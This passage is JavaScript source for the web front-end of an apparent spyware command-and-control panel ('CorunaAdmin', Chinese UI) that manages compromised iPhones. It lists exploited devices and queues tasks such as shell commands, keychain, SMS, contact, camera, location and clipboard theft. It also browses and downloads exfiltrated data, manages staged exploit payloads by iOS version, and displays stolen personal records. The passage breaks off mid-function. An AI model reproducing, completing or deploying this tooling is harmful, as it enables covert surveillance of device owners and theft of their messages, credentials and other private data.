class CorunaAdmin {
    constructor() {
        this.apiBase = '/api';
        this.token = localStorage.getItem('token');
        this.ws = null;
        this.currentPage = 'dashboard';
        this.refreshInterval = null;
        this.init();
    }
    
    init() {
        this.bindEvents();
        this.checkAuth();
    }
    
    bindEvents() {
        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.login();
        });
        
        document.getElementById('logoutBtn').addEventListener('click', () => {
            this.logout();
        });
        
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                e.preventDefault();
                const page = item.dataset.page;
                this.navigateTo(page);
                return false;
            });
        });
        
        document.getElementById('refreshBtn').addEventListener('click', () => {
            this.refreshCurrentPage();
        });
        
        document.getElementById('modalClose').addEventListener('click', () => {
            this.closeModal();
        });
        
        document.getElementById('deviceSearchBtn').addEventListener('click', () => {
            this.searchDevices();
        });
        
        document.getElementById('deviceStatusFilter').addEventListener('change', () => {
            this.searchDevices();
        });
        
        document.getElementById('taskSearchBtn').addEventListener('click', () => {
            this.searchTasks();
        });
        
        document.getElementById('taskStatusFilter').addEventListener('change', () => {
            this.searchTasks();
        });
        
        document.getElementById('exfilSearchBtn').addEventListener('click', () => {
            this.searchExfil();
        });
        
        document.getElementById('exfilCategoryFilter').addEventListener('change', () => {
            this.searchExfil();
        });
        
        document.getElementById('logFilterBtn').addEventListener('click', () => {
            this.filterLogs();
        });
        
        document.getElementById('logLevelFilter').addEventListener('change', () => {
            this.filterLogs();
        });
        
        // 删除选中日志
        document.getElementById('deleteSelectedLogs').addEventListener('click', async () => {
            if (this.selectedLogIds.size === 0) {
                this.showToast('请先选择要删除的日志', 'warning');
                return;
            }
            if (!confirm(`确定要删除选中的 ${this.selectedLogIds.size} 条日志吗？`)) {
                return;
            }
            try {
                // 只删除访问日志
                const accessIds = [];
                const deviceIds = [];
                this.selectedLogIds.forEach(id => {
                    if (typeof id === 'string' && id.startsWith('access_')) {
                        accessIds.push(id.replace('access_', ''));
                    }
                });
                if (accessIds.length > 0) {
                    await this.apiCall(`/admin/logs/access?ids=${accessIds.join(',')}`, 'DELETE');
                }
                this.showToast('删除成功', 'success');
                this.loadLogs();
            } catch (error) {
                console.error('Delete logs error:', error);
                this.showToast('删除失败', 'error');
            }
        });
        
        // 清空全部日志
        document.getElementById('clearAllLogs').addEventListener('click', async () => {
            if (!confirm('确定要清空所有访问日志吗？此操作不可恢复！')) {
                return;
            }
            try {
                await this.apiCall('/admin/logs/access', 'DELETE');
                this.showToast('已清空全部访问日志', 'success');
                this.loadLogs();
            } catch (error) {
                console.error('Clear logs error:', error);
                this.showToast('清空失败', 'error');
            }
        });
        
        document.getElementById('createTaskBtn').addEventListener('click', () => {
            this.showCreateTaskModal();
        });
        
        document.getElementById('uploadPayloadBtn').addEventListener('click', () => {
            this.showUploadPayloadModal();
        });
        
        document.getElementById('generateLinkBtn').addEventListener('click', () => {
            this.showGenerateLinkModal();
        });
        
        document.getElementById('payloadVersionFilter').addEventListener('change', () => {
            this.loadPayloads();
        });
        
        document.getElementById('payloadStageFilter').addEventListener('change', () => {
            this.loadPayloads();
        });
        
        document.getElementById('loadPostexploitBtn').addEventListener('click', () => {
            this.loadPostexploit();
        });
        
        document.getElementById('modal').addEventListener('click', (e) => {
            if (e.target === document.getElementById('modal')) {
                this.closeModal();
            }
        });
    }
    
    async login() {
        const username = document.getElementById('loginUsername').value;
        const password = document.getElementById('loginPassword').value;
        
        try {
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            
            const response = await fetch(`${this.apiBase}/admin/login`, {
                method: 'POST',
                body: formData
            });
            
            if (response.ok) {
                const data = await response.json();
                this.token = data.access_token;
                localStorage.setItem('token', this.token);
                
                this.showMainApp();
                document.getElementById('currentUsername').textContent = data.username;
                this.connectWebSocket();
                this.startAutoRefresh();
                this.showToast('登录成功', 'success');
            } else {
                const error = await response.json();
                document.getElementById('loginError').textContent = error.detail || '登录失败';
            }
        } catch (error) {
            console.error('Login error:', error);
            document.getElementById('loginError').textContent = '网络错误，请重试';
        }
    }
    
    logout() {
        this.token = null;
        localStorage.removeItem('token');
        
        if (this.ws) {
            this.ws.close();
        }
        
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
        }
        
        document.getElementById('loginPage').style.display = 'flex';
        document.getElementById('mainApp').style.display = 'none';
        document.getElementById('loginError').textContent = '';
        document.getElementById('loginUsername').value = '';
        document.getElementById('loginPassword').value = '';
    }
    
    checkAuth() {
        if (this.token) {
            this.showMainApp();
            this.connectWebSocket();
            this.startAutoRefresh();
        } else {
            document.getElementById('loginPage').style.display = 'flex';
            document.getElementById('mainApp').style.display = 'none';
        }
    }
    
    showMainApp() {
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('mainApp').style.display = 'flex';
        setTimeout(() => {
            this.showPage('dashboard');
        }, 50);
    }
    
    async apiCall(endpoint, options = {}) {
        const headers = {
            'Content-Type': 'application/json',
            ...options.headers
        };
        
        if (this.token) {
            headers['Authorization'] = `Bearer ${this.token}`;
        }
        
        const response = await fetch(`${this.apiBase}${endpoint}`, {
            ...options,
            headers
        });
        
        if (response.status === 401) {
            this.logout();
            throw new Error('Unauthorized');
        }
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        return response.json();
    }
    
    showPage(pageName) {
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
        });
        
        const targetPage = document.getElementById(`${pageName}Page`);
        if (targetPage) {
            targetPage.classList.add('active');
        }
        
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
            if (item.dataset.page === pageName) {
                item.classList.add('active');
            }
        });
        
        this.currentPage = pageName;
        this.loadPageData(pageName);
    }
    
    navigateTo(pageName) {
        this.showPage(pageName);
    }
    
    loadPageData(pageName) {
        switch (pageName) {
            case 'dashboard':
                this.loadDashboard();
                break;
            case 'devices':
                this.loadDevices();
                break;
            case 'tasks':
                this.loadTasks();
                break;
            case 'exfil':
                this.loadExfil();
                break;
            case 'postexploit':
                this.loadPostexploit();
                break;
            case 'logs':
                this.loadLogs();
                break;
            case 'payloads':
                this.loadPayloads();
                break;
        }
    }
    
    refreshCurrentPage() {
        this.loadPageData(this.currentPage);
        this.showToast('刷新成功', 'success');
    }
    
    async loadDashboard() {
        try {
            const stats = await this.apiCall('/admin/stats');
            this.updateDashboardStats(stats);
            this.updateRecentDevices(stats.recent_devices || []);
            this.updateRecentTasks(stats.recent_tasks || []);
        } catch (error) {
            console.error('Load dashboard error:', error);
            this.showToast('加载仪表盘数据失败', 'error');
        }
    }
    
    updateDashboardStats(stats) {
        document.getElementById('totalDevices').textContent = stats.total_devices || 0;
        document.getElementById('onlineDevices').textContent = stats.online_devices || 0;
        document.getElementById('exploitedDevices').textContent = stats.exploited_devices || 0;
        document.getElementById('totalTasks').textContent = stats.total_tasks || 0;
        document.getElementById('pendingTasks').textContent = stats.pending_tasks || 0;
        document.getElementById('completedTasks').textContent = stats.completed_tasks || 0;
    }
    
    updateRecentDevices(devices) {
        const tbody = document.getElementById('recentDevicesTable');
        tbody.innerHTML = '';
        
        devices.slice(0, 5).forEach(device => {
            const row = this.createDeviceRow(device);
            tbody.appendChild(row);
        });
        
        if (devices.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #9ca3af;">暂无设备</td></tr>';
        }
    }
    
    updateRecentTasks(tasks) {
        const tbody = document.getElementById('recentTasksTable');
        tbody.innerHTML = '';
        
        tasks.slice(0, 5).forEach(task => {
            const row = this.createTaskRow(task);
            tbody.appendChild(row);
        });
        
        if (tasks.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #9ca3af;">暂无任务</td></tr>';
        }
    }
    
    async loadDevices() {
        try {
            const devices = await this.apiCall('/admin/devices');
            this.renderDevices(devices);
        } catch (error) {
            console.error('Load devices error:', error);
            this.showToast('加载设备列表失败', 'error');
        }
    }
    
    renderDevices(devices) {
        const tbody = document.getElementById('devicesTable');
        tbody.innerHTML = '';
        
        devices.forEach(device => {
            const row = this.createDeviceRow(device, true);
            tbody.appendChild(row);
        });
        
        if (devices.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #9ca3af;">暂无设备</td></tr>';
        }
    }
    
    createDeviceRow(device, withActions = false) {
        const row = document.createElement('tr');
        const exploited = device.exploit_stage === 'completed' || device.status === 'exploited';
        
        row.innerHTML = `
            <td>${this.truncate(device.device_uuid, 20)}</td>
            <td>${device.ios_version || '-'}</td>
            <td>${device.chipset || '-'}</td>
            <td><span class="status-badge ${device.status}">${this.getStatusText(device.status)}</span></td>
            <td>${exploited ? '<span style="color: #10b981; font-weight: bold;">是</span>' : '<span style="color: #6b7280;">否</span>'}</td>
            <td>${this.formatDate(device.last_seen)}</td>
            ${withActions ? `
                <td>
                    <button class="action-btn view" onclick="admin.viewDevice('${device.device_uuid}')">查看</button>
                    <button class="action-btn delete" onclick="admin.deleteDevice('${device.device_uuid}')">删除</button>
                </td>
            ` : ''}
        `;
        
        return row;
    }
    
    async viewDevice(deviceUuid) {
        try {
            const detail = await this.apiCall(`/admin/devices/${deviceUuid}/detail`);
            this.showDeviceDetailModal(detail);
        } catch (error) {
            console.error('View device error:', error);
            this.showToast('获取设备详情失败', 'error');
        }
    }
    
    async deleteDevice(deviceUuid) {
        if (!confirm('确定要删除此设备吗？')) {
            return;
        }
        
        try {
            await this.apiCall(`/admin/devices/${deviceUuid}`, {
                method: 'DELETE'
            });
            this.showToast('设备删除成功', 'success');
            this.loadDevices();
        } catch (error) {
            console.error('Delete device error:', error);
            this.showToast('删除设备失败', 'error');
        }
    }
    
    async searchDevices() {
        const query = document.getElementById('deviceSearch').value;
        const status = document.getElementById('deviceStatusFilter').value;
        
        try {
            let endpoint = '/admin/devices';
            const params = new URLSearchParams();
            
            if (query) {
                params.append('search', query);
            }
            
            if (status) {
                params.append('status', status);
            }
            
            if (params.toString()) {
                endpoint += '?' + params.toString();
            }
            
            const devices = await this.apiCall(endpoint);
            this.renderDevices(devices);
        } catch (error) {
            console.error('Search devices error:', error);
            this.showToast('搜索设备失败', 'error');
        }
    }
    
    async loadTasks() {
        try {
            const tasks = await this.apiCall('/admin/tasks');
            this.renderTasks(tasks);
        } catch (error) {
            console.error('Load tasks error:', error);
            this.showToast('加载任务列表失败', 'error');
        }
    }
    
    renderTasks(tasks) {
        const tbody = document.getElementById('tasksTable');
        tbody.innerHTML = '';
        
        tasks.forEach(task => {
            const row = this.createTaskRow(task, true);
            tbody.appendChild(row);
        });
        
        if (tasks.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #9ca3af;">暂无任务</td></tr>';
        }
    }
    
    createTaskRow(task, withActions = false) {
        const row = document.createElement('tr');
        
        row.innerHTML = `
            <td>${task.id}</td>
            <td>${task.task_type}</td>
            <td>${this.truncate(task.device_uuid, 15)}</td>
            <td><span class="status-badge ${task.status}">${this.getStatusText(task.status)}</span></td>
            <td>${task.priority}</td>
            <td>${this.formatDate(task.created_at)}</td>
            ${withActions ? `
                <td>
                    <button class="action-btn view" onclick="admin.viewTask(${task.id})">查看</button>
                    <button class="action-btn delete" onclick="admin.cancelTask(${task.id})">取消</button>
                </td>
            ` : ''}
        `;
        
        return row;
    }
    
    async viewTask(taskId) {
        try {
            const task = await this.apiCall(`/tasks/${taskId}`);
            this.showTaskDetailModal(task);
        } catch (error) {
            console.error('View task error:', error);
            this.showToast('获取任务详情失败', 'error');
        }
    }
    
    async cancelTask(taskId) {
        if (!confirm('确定要取消此任务吗？')) {
            return;
        }
        
        try {
            await this.apiCall(`/tasks/${taskId}`, {
                method: 'DELETE'
            });
            this.showToast('任务已取消', 'success');
            this.loadTasks();
        } catch (error) {
            console.error('Cancel task error:', error);
            this.showToast('取消任务失败', 'error');
        }
    }
    
    async searchTasks() {
        const query = document.getElementById('taskSearch').value;
        const status = document.getElementById('taskStatusFilter').value;
        
        try {
            let endpoint = '/admin/tasks';
            const params = new URLSearchParams();
            
            if (query) {
                params.append('search', query);
            }
            
            if (status) {
                params.append('status', status);
            }
            
            if (params.toString()) {
                endpoint += '?' + params.toString();
            }
            
            const tasks = await this.apiCall(endpoint);
            this.renderTasks(tasks);
        } catch (error) {
            console.error('Search tasks error:', error);
            this.showToast('搜索任务失败', 'error');
        }
    }
    
    showCreateTaskModal() {
        const modalBody = document.getElementById('modalBody');
        modalBody.innerHTML = `
            <form id="createTaskForm">
                <div class="form-group">
                    <label>设备UUID</label>
                    <input type="text" id="taskDeviceUuid" required placeholder="输入设备UUID">
                </div>
                <div class="form-group">
                    <label>任务类型</label>
                    <select id="taskType" required>
                        <option value="shell">Shell命令</option>
                        <option value="upload">上传文件</option>
                        <option value="download">下载文件</option>
                        <option value="screenshot">截图</option>
                        <option value="keychain">钥匙串</option>
                        <option value="contact">联系人</option>
                        <option value="sms">短信</option>
                        <option value="camera">相机</option>
                        <option value="location">位置</option>
                        <option value="app_list">应用列表</option>
                        <option value="process_list">进程列表</option>
                        <option value="wifi_scan">WiFi扫描</option>
                        <option value="clipboard">剪贴板</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>任务载荷</label>
                    <textarea id="taskPayload" placeholder="输入任务参数或命令"></textarea>
                </div>
                <div class="form-group">
                    <label>优先级</label>
                    <input type="number" id="taskPriority" value="0" min="0" max="10">
                </div>
                <button type="submit" class="btn btn-primary btn-block">创建任务</button>
            </form>
        `;
        
        document.getElementById('modalTitle').textContent = '创建任务';
        document.getElementById('modal').classList.add('active');
        
        document.getElementById('createTaskForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.createTask();
        });
    }
    
    async createTask() {
        const deviceUuid = document.getElementById('taskDeviceUuid').value;
        const taskType = document.getElementById('taskType').value;
        const payload = document.getElementById('taskPayload').value;
        const priority = parseInt(document.getElementById('taskPriority').value);
        
        try {
            await this.apiCall('/tasks/create', {
                method: 'POST',
                body: JSON.stringify({
                    device_uuid: deviceUuid,
                    task_type: taskType,
                    payload: payload,
                    priority: priority
                })
            });
            
            this.showToast('任务创建成功', 'success');
            this.closeModal();
            this.loadTasks();
        } catch (error) {
            console.error('Create task error:', error);
            this.showToast('创建任务失败', 'error');
        }
    }
    
    async loadExfil() {
        try {
            const exfil = await this.apiCall('/admin/exfil');
            this.renderExfil(exfil);
        } catch (error) {
            console.error('Load exfil error:', error);
            this.showToast('加载外泄数据失败', 'error');
        }
    }
    
    renderExfil(exfilList) {
        const tbody = document.getElementById('exfilTable');
        tbody.innerHTML = '';
        
        exfilList.forEach(exfil => {
            const row = this.createExfilRow(exfil);
            tbody.appendChild(row);
        });
        
        if (exfilList.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: #9ca3af;">暂无外泄数据</td></tr>';
        }
    }
    
    createExfilRow(exfil) {
        const row = document.createElement('tr');
        
        row.innerHTML = `
            <td>${exfil.id}</td>
            <td>${this.truncate(exfil.device_uuid, 15)}</td>
            <td>${exfil.category}</td>
            <td>${this.formatBytes(exfil.file_size || 0)}</td>
            <td>${this.formatDate(exfil.created_at)}</td>
            <td>
                <button class="action-btn view" onclick="admin.downloadExfil(${exfil.id})">下载</button>
                <button class="action-btn delete" onclick="admin.deleteExfil(${exfil.id})">删除</button>
            </td>
        `;
        
        return row;
    }
    
    async downloadExfil(exfilId) {
        try {
            window.open(`${this.apiBase}/upload/download/${exfilId}`, '_blank');
        } catch (error) {
            console.error('Download exfil error:', error);
            this.showToast('下载失败', 'error');
        }
    }
    
    async deleteExfil(exfilId) {
        if (!confirm('确定要删除此外泄数据吗？')) {
            return;
        }
        
        try {
            await this.apiCall(`/admin/exfil/${exfilId}`, {
                method: 'DELETE'
            });
            this.showToast('删除成功', 'success');
            this.loadExfil();
        } catch (error) {
            console.error('Delete exfil error:', error);
            this.showToast('删除失败', 'error');
        }
    }
    
    async searchExfil() {
        const query = document.getElementById('exfilSearch').value;
        const category = document.getElementById('exfilCategoryFilter').value;
        
        try {
            let endpoint = '/admin/exfil';
            const params = new URLSearchParams();
            
            if (query) {
                params.append('search', query);
            }
            
            if (category) {
                params.append('category', category);
            }
            
            if (params.toString()) {
                endpoint += '?' + params.toString();
            }
            
            const exfil = await this.apiCall(endpoint);
            this.renderExfil(exfil);
        } catch (error) {
            console.error('Search exfil error:', error);
            this.showToast('搜索外泄数据失败', 'error');
        }
    }
    
    async loadLogs() {
        try {
            const logs = await this.apiCall('/admin/logs');
            this.renderLogs(logs);
        } catch (error) {
            console.error('Load logs error:', error);
            this.showToast('加载日志失败', 'error');
        }
    }
    
    renderLogs(logs) {
        const container = document.getElementById('logContainer');
        
        // 存储日志数据用于选择
        this.currentLogs = logs;
        this.selectedLogIds = new Set();
        
        if (logs.length === 0) {
            container.innerHTML = '<div style="text-align: center; color: #9ca3af; padding: 40px;">暂无日志</div>';
            return;
        }
        
        // 创建表格
        let html = `
            <table class="data-table" style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background: #f9fafb; text-align: left;">
                        <th style="padding: 10px; border-bottom: 2px solid #e5e7eb; width: 40px;">
                            <input type="checkbox" id="selectAllLogsTable">
                        </th>
                        <th style="padding: 10px; border-bottom: 2px solid #e5e7eb; width: 160px;">时间</th>
                        <th style="padding: 10px; border-bottom: 2px solid #e5e7eb; width: 80px;">类型</th>
                        <th style="padding: 10px; border-bottom: 2px solid #e5e7eb; width: 130px;">IP地址</th>
                        <th style="padding: 10px; border-bottom: 2px solid #e5e7eb;">详情</th>
                    </tr>
                </thead>
                <tbody>
        `;
        
        logs.forEach(log => {
            if (log.type === 'access') {
                const ua = log.user_agent || '';
                const isIOS = ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod');
                const deviceType = isIOS ? 'iOS设备' : '其他设备';
                let iosVersion = '';
                const match = ua.match(/iPhone OS (\d+)/);
                if (match) {
                    iosVersion = ` (iOS ${match[1]})`;
                }
                
                html += `
                    <tr class="log-row" data-log-id="${log.id}" data-log-type="${log.type}" style="border-bottom: 1px solid #f3f4f6;">
                        <td style="padding: 10px;">
                            <input type="checkbox" class="log-checkbox" data-id="${log.id}" style="cursor: pointer;">
                        </td>
                        <td style="padding: 10px; color: #6b7280; font-size: 13px;">
                            ${this.formatDateTime(log.timestamp)}
                        </td>
                        <td style="padding: 10px;">
                            <span style="background: #dbeafe; color: #1d4ed8; padding: 2px 8px; border-radius: 4px; font-size: 12px;">
                                ${deviceType}${iosVersion}
                            </span>
                        </td>
                        <td style="padding: 10px; font-family: monospace; color: #374151;">
                            ${log.ip}
                        </td>
                        <td style="padding: 10px;">
                            <div style="color: #374151; margin-bottom: 4px;">
                                <strong>${log.path}</strong> - ${log.method}
                            </div>
                            <div style="color: #9ca3af; font-size: 11px; word-break: break-all;">
                                ${ua}
                            </div>
                        </td>
                    </tr>
                `;
            } else {
                // 设备日志
                html += `
                    <tr class="log-row" data-log-id="${log.id}" data-log-type="${log.type}" style="border-bottom: 1px solid #f3f4f6;">
                        <td style="padding: 10px;">
                            <input type="checkbox" class="log-checkbox" data-id="${log.id}" style="cursor: pointer;">
                        </td>
                        <td style="padding: 10px; color: #6b7280; font-size: 13px;">
                            ${this.formatDateTime(log.timestamp || log.created_at)}
                        </td>
                        <td style="padding: 10px;">
                            <span style="background: #fef3c7; color: #b45309; padding: 2px 8px; border-radius: 4px; font-size: 12px;">
                                ${log.log_level || 'INFO'}
                            </span>
                        </td>
                        <td style="padding: 10px; font-family: monospace; color: #374151;">
                            ${this.truncate(log.device_uuid, 12)}
                        </td>
                        <td style="padding: 10px;">
                            <div style="color: #374151;">
                                <strong>[${log.stage || ''}]</strong> ${log.message || log.event || ''}
                            </div>
                        </td>
                    </tr>
                `;
            }
        });
        
        html += '</tbody></table>';
        container.innerHTML = html;
        
        // 更新全选事件
        document.getElementById('selectAllLogsTable').addEventListener('change', (e) => {
            const checkboxes = document.querySelectorAll('.log-checkbox');
            checkboxes.forEach(cb => {
                cb.checked = e.target.checked;
                const id = cb.dataset.id;
                if (e.target.checked) {
                    this.selectedLogIds.add(id);
                } else {
                    this.selectedLogIds.delete(id);
                }
            });
            this.updateSelectedCount();
        });
        
        // 单个复选框事件
        document.querySelectorAll('.log-checkbox').forEach(cb => {
            cb.addEventListener('change', (e) => {
                const id = e.target.dataset.id;
                if (e.target.checked) {
                    this.selectedLogIds.add(id);
                } else {
                    this.selectedLogIds.delete(id);
                }
                this.updateSelectedCount();
            });
        });
        
        this.updateSelectedCount();
    }
    
    updateSelectedCount() {
        const countEl = document.getElementById('selectedCount');
        if (countEl) {
            countEl.textContent = `已选择: ${this.selectedLogIds.size}`;
        }
    }
    
    async filterLogs() {
        const deviceUuid = document.getElementById('logDeviceFilter').value;
        const logLevel = document.getElementById('logLevelFilter').value;
        
        try {
            let endpoint = '/admin/logs';
            const params = new URLSearchParams();
            
            if (deviceUuid) {
                params.append('device_uuid', deviceUuid);
            }
            
            if (logLevel) {
                params.append('log_level', logLevel);
            }
            
            if (params.toString()) {
                endpoint += '?' + params.toString();
            }
            
            const logs = await this.apiCall(endpoint);
            this.renderLogs(logs);
        } catch (error) {
            console.error('Filter logs error:', error);
            this.showToast('筛选日志失败', 'error');
        }
    }
    
    connectWebSocket() {
        try {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/ws/admin`;
            
            this.ws = new WebSocket(wsUrl);
            
            this.ws.onopen = () => {
                console.log('WebSocket connected');
                this.updateConnectionStatus(true);
            };
            
            this.ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    this.handleWebSocketMessage(data);
                } catch (err) {
                    console.warn('WebSocket message parse error:', err.message);
                }
            };
            
            this.ws.onclose = () => {
                console.log('WebSocket disconnected');
                this.updateConnectionStatus(false);
                
                setTimeout(() => {
                    if (this.token) {
                        this.connectWebSocket();
                    }
                }, 5000);
            };
            
            this.ws.onerror = (error) => {
                console.warn('WebSocket connection error (will retry):', error.message || 'unknown');
            };
        } catch (error) {
            console.warn('WebSocket init failed:', error.message);
        }
    }
    
    handleWebSocketMessage(data) {
        switch (data.type) {
            case 'device_connected':
                this.showToast(`设备 ${data.device_uuid} 已连接`, 'success');
                if (this.currentPage === 'dashboard') {
                    this.loadDashboard();
                }
                break;
                
            case 'device_disconnected':
                this.showToast(`设备 ${data.device_uuid} 已断开`, 'warning');
                if (this.currentPage === 'dashboard') {
                    this.loadDashboard();
                }
                break;
                
            case 'device_log':
                if (this.currentPage === 'logs') {
                    this.loadLogs();
                }
                break;
                
            case 'task_result':
                this.showToast(`任务 ${data.task_id} 完成: ${data.status}`, data.status === 'completed' ? 'success' : 'error');
                if (this.currentPage === 'tasks') {
                    this.loadTasks();
                }
                break;
        }
    }
    
    updateConnectionStatus(connected) {
        const statusDot = document.querySelector('.connection-status .status-dot');
        const statusText = document.querySelector('.connection-status .status-text');
        
        if (connected) {
            statusDot.className = 'status-dot online';
            statusText.textContent = '已连接';
        } else {
            statusDot.className = 'status-dot offline';
            statusText.textContent = '连接中...';
        }
    }
    
    startAutoRefresh() {
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
        }
        
        this.refreshInterval = setInterval(() => {
            this.loadPageData(this.currentPage);
        }, 30000);
    }
    
    showDeviceDetailModal(detail) {
        const modalBody = document.getElementById('modalBody');
        const exploited = detail.device.exploit_stage === 'completed' || detail.device.status === 'exploited';
        
        modalBody.innerHTML = `
            <div class="device-detail">
                <h4>设备信息</h4>
                <div class="detail-grid">
                    <div><strong>设备UUID:</strong> ${detail.device.device_uuid}</div>
                    <div><strong>型号:</strong> ${detail.device.device_model || '-'}</div>
                    <div><strong>iOS版本:</strong> ${detail.device.ios_version || '-'}</div>
                    <div><strong>芯片:</strong> ${detail.device.chipset || '-'}</div>
                    <div><strong>状态:</strong> ${this.getStatusText(detail.device.status)}</div>
                    <div><strong>受控:</strong> ${exploited ? '是' : '否'}</div>
                    <div><strong>IP地址:</strong> ${detail.device.ip_address || '-'}</div>
                    <div><strong>最后上线:</strong> ${this.formatDateTime(detail.device.last_seen)}</div>
                </div>
                
                <h4>数据统计</h4>
                <div class="detail-grid">
                    <div><strong>联系人:</strong> ${detail.data_counts?.contacts || 0}</div>
                    <div><strong>短信:</strong> ${detail.data_counts?.sms || 0}</div>
                    <div><strong>通话记录:</strong> ${detail.data_counts?.calls || 0}</div>
                    <div><strong>钥匙串:</strong> ${detail.data_counts?.keychains || 0}</div>
                    <div><strong>照片:</strong> ${detail.data_counts?.photos || 0}</div>
                    <div><strong>应用:</strong> ${detail.data_counts?.apps || 0}</div>
                </div>
                
                <h4>任务统计</h4>
                <div class="detail-grid">
                    <div><strong>总任务:</strong> ${detail.device.total_tasks || 0}</div>
                    <div><strong>已完成:</strong> ${detail.device.completed_tasks || 0}</div>
                    <div><strong>失败:</strong> ${detail.device.failed_tasks || 0}</div>
                </div>
            </div>
        `;
        
        document.getElementById('modalTitle').textContent = '设备详情';
        document.getElementById('modal').classList.add('active');
    }
    
    showTaskDetailModal(task) {
        const modalBody = document.getElementById('modalBody');
        
        modalBody.innerHTML = `
            <div class="task-detail">
                <h4>任务信息</h4>
                <div class="detail-grid">
                    <div><strong>任务ID:</strong> ${task.id}</div>
                    <div><strong>类型:</strong> ${task.task_type}</div>
                    <div><strong>设备UUID:</strong> ${task.device_uuid}</div>
                    <div><strong>状态:</strong> ${this.getStatusText(task.status)}</div>
                    <div><strong>优先级:</strong> ${task.priority}</div>
                    <div><strong>创建时间:</strong> ${this.formatDateTime(task.created_at)}</div>
                    <div><strong>开始时间:</strong> ${task.started_at ? this.formatDateTime(task.started_at) : '-'}</div>
                    <div><strong>完成时间:</strong> ${task.completed_at ? this.formatDateTime(task.completed_at) : '-'}</div>
                </div>
                
                <h4>任务载荷</h4>
                <pre>${task.payload || '无'}</pre>
                
                <h4>执行结果</h4>
                <pre>${task.result || '无'}</pre>
                
                ${task.error_message ? `<h4>错误信息</h4><pre>${task.error_message}</pre>` : ''}
            </div>
        `;
        
        document.getElementById('modalTitle').textContent = '任务详情';
        document.getElementById('modal').classList.add('active');
    }
    
    closeModal() {
        document.getElementById('modal').classList.remove('active');
    }
    
    showToast(message, type = 'info') {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.className = `toast ${type} active`;
        
        setTimeout(() => {
            toast.classList.remove('active');
        }, 3000);
    }
    
    formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    formatDate(dateString) {
        if (!dateString) return '-';
        const date = new Date(dateString);
        return date.toLocaleDateString('zh-CN');
    }
    
    formatDateTime(dateString) {
        if (!dateString) return '-';
        const date = new Date(dateString);
        return date.toLocaleString('zh-CN');
    }
    
    truncate(str, length) {
        if (!str) return '-';
        if (str.length <= length) return str;
        return str.substring(0, length) + '...';
    }
    
    getStatusText(status) {
        const statusMap = {
            'online': '在线',
            'offline': '离线',
            'exploited': '已利用',
            'busy': '忙碌',
            'error': '错误',
            'pending': '待处理',
            'running': '运行中',
            'completed': '已完成',
            'failed': '失败',
            'cancelled': '已取消',
            'timeout': '超时'
        };
        return statusMap[status] || status;
    }

    async loadPayloads() {
        try {
            const version = document.getElementById('payloadVersionFilter').value;
            const stage = document.getElementById('payloadStageFilter').value;
            
            let endpoint = '/payloads/list';
            const params = new URLSearchParams();
            
            if (version) params.append('ios_version', version);
            if (stage) params.append('exploit_stage', stage);
            
            if (params.toString()) {
                endpoint += '?' + params.toString();
            }
            
            const result = await this.apiCall(endpoint);
            this.renderPayloads(result.payloads || []);
            this.loadPayloadFilters();
        } catch (error) {
            console.error('Load payloads error:', error);
            this.showToast('加载Payload列表失败', 'error');
        }
    }

    async loadPostexploit() {
        const deviceUuid = document.getElementById('postexploitDeviceUuid').value;
        const category = document.getElementById('postexploitCategory').value;
        
        if (!deviceUuid) {
            document.getElementById('postexploitContent').innerHTML = '<div style="text-align: center; color: #9ca3af; padding: 40px;">请输入设备UUID后点击加载</div>';
            return;
        }
        
        try {
            const data = await this.apiCall(`/postexploit/${category}/${deviceUuid}`);
            this.renderPostexploitData(data, category);
        } catch (error) {
            console.error('Load postexploit error:', error);
            document.getElementById('postexploitContent').innerHTML = '<div style="text-align: center; color: #ef4444; padding: 40px;">加载数据失败，请检查设备UUID是否正确</div>';
        }
    }

    renderPostexploitData(data, category) {
        const container = document.getElementById('postexploitContent');
        
        if (!data || data.length === 0) {
            container.innerHTML = '<div style="text-align: center; color: #9ca3af; padding: 40px;">暂无数据</div>';
            return;
        }
        
        const renderFunctions = {
            contacts: this.renderContacts.bind(this),
            sms: this.renderSMS.bind(this),
            calls: this.renderCalls.bind(this),
            keychain: this.renderKeychain.bind(this),
            photos: this.renderPhotos.bind(this),
            clipboard: this.renderClipboard.bind(this),
            apps: this.renderApps.bind(this),
            processes: this.renderProcesses.bind(this),
            wifi: this.renderWiFi.bind(this),
            browser_history: this.renderBrowserHistory.bind(this),
            calendar: this.renderCalendar.bind(this),
            notes: this.renderNotes.bind(this),
            health: this.renderHealth.bind(this)
        };
        
        const renderer = renderFunctions[category];
        if (renderer) {
            container.innerHTML = renderer(data);
        } else {
            container.innerHTML = this.renderGenericTable(data);
        }
    }

    renderContacts(data) {
        return `<table class="data-table">
            <thead><tr><th>姓名</th><th>电话</th><th>邮箱</th><th>创建时间</th></tr></thead>
            <tbody>${data.map(c => `<tr><td>${c.name || '-'}</td><td>${c.phone_number || '-'}</td><td>${c.email || '-'}</td><td>${this.formatDateTime(c.created_at)}</td></tr>`).join('')}</tbody>
